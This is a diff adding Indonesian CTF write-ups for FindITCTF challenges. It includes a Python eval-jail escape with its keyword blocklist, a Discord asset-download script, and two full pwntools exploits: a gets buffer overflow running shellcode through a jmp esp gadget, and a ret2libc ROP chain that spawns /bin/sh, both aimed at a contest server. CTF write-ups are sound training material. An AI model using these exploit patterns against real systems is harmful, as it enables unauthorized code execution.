@@ -37,7 +37,7 @@
 **Binary Exploitation (TODO)**
 
 - [**Elevator (907 pts)**](#elevator-907-pts)
-- [**Everything Machine 2.0 (931 pts)**](#everything-machine-2-0-931-pts)
+- [**Everything Machine 2.0 (931 pts)**](#everything-machine-20-931-pts)
 
 # Forensics
 
@@ -310,3 +310,166 @@ Password check:
 ![alt_text](images/woilahcik-4.png "image_tooltip")
 
 **Flag: FindITCTF{ez_bgt_OIUMa}**
+
+# Miscellaneous
+
+## Your Journey (901 pts)
+
+Diberikan sebuah service yang intinya akan melakukan eval pada input yang kita berikan. Terdapat beberapa string yang tidak diizinkan pada input kita.
+
+![alt_text](images/yourjourney-1.png "image_tooltip")
+
+```py
+block = [";", '"',"os", "_", "\\", "`", " ", "-", "!", "[", "]", "*", "import", "eval", "banner", "echo", "cat", "%", "&", ">", "<", "+", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "b", "s", "lower", "upper", "system", "}", "{", ".py", ]
+```
+
+Karena pada blacklist string tidak terdapat exec dan input kami dapat langsung mengeksekusi dua fungsi tersebut. Input: `exec(input())` lalu menggunakan module os untuk mengeksekusi command.
+
+![alt_text](images/yourjourney-2.png "image_tooltip")
+
+![alt_text](images/yourjourney-3.png "image_tooltip")
+
+### Flag: FindITCTF{4m0GU5_y0u_Sh0u1d_ch3ck_4ll_th3_f1l3s}
+
+## Neobim Enjoyer (982 pts)
+
+Diberikan sebuah ekstensi dari neovim. Pada awalnya saya melihat terdapat sebuah string flag pada bagian `file_assets.lua` dan mengira akan ada assets tersebut pada Application ID yang terdapat pada source code.
+
+![alt_text](images/neobim-1.png "image_tooltip")
+
+Namun setelah kami periksa tidak terdapat assets yang bernama `flag_*` pada application tersebut.
+
+![alt_text](images/neobim-2.png "image_tooltip")
+
+Lalu setelah stuck cukup lama, kami tertarik untuk mencoba melihat assets dari Application ID yang terdapat pada `README.md`(yang awalnya kami kira hanya placeholder) dan ternyata terdapat assets `flag_*` yang dimaksud.
+
+![alt_text](images/neobim-3.png "image_tooltip")
+
+Kami membuat script python untuk mendapatkan setiap file flag tersebut.
+
+```py
+import requests
+
+ASSETS = "https://discordapp.com/api/oauth2/applications/1233467180696207390/assets"
+CDN_URL = "https://cdn.discordapp.com/app-assets/1233467180696207390/"
+
+def getAssets(url=ASSETS):
+    r = requests.get(url)
+    return r.json()
+
+def getFileIDByName(name, data):
+    for asset in data:
+        if asset['name'] == name:
+            return asset['id']
+
+def downloadFileByID(filename, savefile, cdn=CDN_URL):
+    url = cdn + filename
+    r = requests.get(url)
+    with open(savefile, 'wb') as f:
+        f.write(r.content)
+
+data = getAssets()
+for i in range(0, 20):
+    filename = getFileIDByName("flag_" + str(i), data) + ".png"
+    downloadFileByID(filename, savefile="result/flag_" + str(i) + ".png")
+```
+
+![alt_text](images/neobim-4.png "image_tooltip")
+
+**Flag: FindITCTF{n30Vim_i5_Aw3SoM3!!!}**
+
+# Binary Exploitation (PWN)
+
+## Elevator (907 pts)
+
+Binary dengan vulnerability buffer overflow karena input menggunakan **gets** dengan tidak ada mitigasi apapun. Lalu terdapat gadget **jmp esp** yang bisa digunakan untuk _jump_ ke shellcode yang kita buat.
+
+```py
+#!/usr/bin/env python3
+
+from pwn import *
+
+PATH = './admin'
+
+HOST = '103.191.63.187'
+PORT = 5000
+
+def exploit(r):
+    payload  = b'A' * 0x40C
+    payload += p32(0x08049199) # jump esp
+    payload += asm(shellcraft.sh())
+
+    r.recvlines(2)
+    r.sendline(payload)
+
+    r.interactive()
+
+if __name__ == '__main__':
+    elf = ELF(PATH, checksec=True)
+
+    if args.REMOTE:
+        r = remote(HOST, PORT)
+    else:
+        r = elf.process(aslr=False, env={})
+
+    exploit(r)
+```
+
+![alt_text](images/elevator.png "image_tooltip")
+
+**Flag: FindITCTF{m4m4h_4ku_h3k3r_l33t}**
+
+## Everything Machine 2.0 (931 pts)
+
+Sama seperti vulnerability sebelumnya. Namun, disini tidak ada gadget yang dapat kita gunakan seperti sebelumnya dan sekarang stack tidak memiliki permission executable. Kita tidak dapat eksekusi shellcode, namun bisa melakukan ROP untuk mendapatkan alamat libc dan ROP untuk memanggil `system(“/bin/sh”)`.
+
+```py
+#!/usr/bin/env python3
+
+from pwn import *
+
+PATH = './everything4'
+
+HOST = '103.191.63.187'
+PORT = 5001
+
+def exploit(r):
+    payload  = b'A' * 0x7f4
+    payload += p32(elf.sym.puts)
+    payload += p32(elf.sym.main)
+    payload += p32(elf.got.puts)
+
+    r.recvlines(2)
+    r.sendline(payload)
+
+    puts = u32(r.recvline(0))
+
+    libc.address = puts - libc.sym.puts
+
+    info(f'puts: {hex(puts)}')
+    info(f'libc: {hex(libc.address)}')
+
+    payload  = b'A' * 0x7f4
+    payload += p32(libc.sym.system)
+    payload += p32(elf.sym.main)
+    payload += p32(next(libc.search(b'/bin/sh')))
+
+    r.recvlines(2)
+    r.sendline(payload)
+
+    r.interactive()
+
+if __name__ == '__main__':
+    elf = ELF(PATH, checksec=True)
+    libc = ELF("./libc.so.6", checksec=True)
+
+    if args.REMOTE:
+        r = remote(HOST, PORT)
+    else:
+        r = elf.process(aslr=False, env={})
+    exploit(r)
+```
+
+![alt_text](images/machine.png "image_tooltip")
+
+**Flag: FindITCTF{Pl3as3_3x!t_th3_pl4tf0rm}**
